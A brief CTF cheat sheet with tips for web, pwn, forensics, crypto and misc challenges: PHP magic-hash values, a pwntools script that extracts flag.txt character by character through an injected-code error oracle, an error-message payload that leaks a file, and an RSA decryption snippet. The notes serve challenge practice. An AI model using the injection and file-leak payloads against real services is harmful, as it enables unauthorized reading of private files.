# CTF-Notes
## Web
* PHP type juggling
`md5( 0e215962017 ) ---> 0e291242476940776845150308577824`
```
plaintext :  0e001233333333333334557778889
md4 hash  :  0e434041524824285414215559233446
```
 
## Pwn
##### Timing Attack poc 
```
from pwn import remote
import string
host = ""
port = 
s = remote(host, port)
flag = ""
index = 0
changed = True
s.recvuntil('!\n')
while changed:
    changed = False
    for c in '_{}' + string.printable:
    	print("testing {}".format(flag + c))
    	command = '''1/0 if open('flag.txt','r').read({})[{}] == ''{}' else 0\n'''.format(index + 1, index, c)
    	print(command)
    	s.send(command)
    	answer = s.recvuntil("!\n")
    	if b'Traceback' in answer:
    		flag += c
    		changed = True
    		index += 1
    		break
```

## Forensics
* .docx file ? try open it as zip archive  


## Reverse Engineering
## Crypto
#### solve RSA


```
from Crypto.Util.number import inverse,long_to_bytes

p = 
q = 
e =
ct = 

n = p * q
phi = (p - 1) * (q - 1)
d = inverse(e,phi)
plain = pow(ct,d,n)
print(long_to_bytes(plain))
```
[cool RSA write-ups](https://github.com/W3rni0/RACTF_2020) 
## Misc/various 
#### Raise an error with the flag (python)
Ex: `raise NameError(open('flag.txt','r').read(50))`

#### No output on the shell?
try redirection ex: `ls 1>&0`
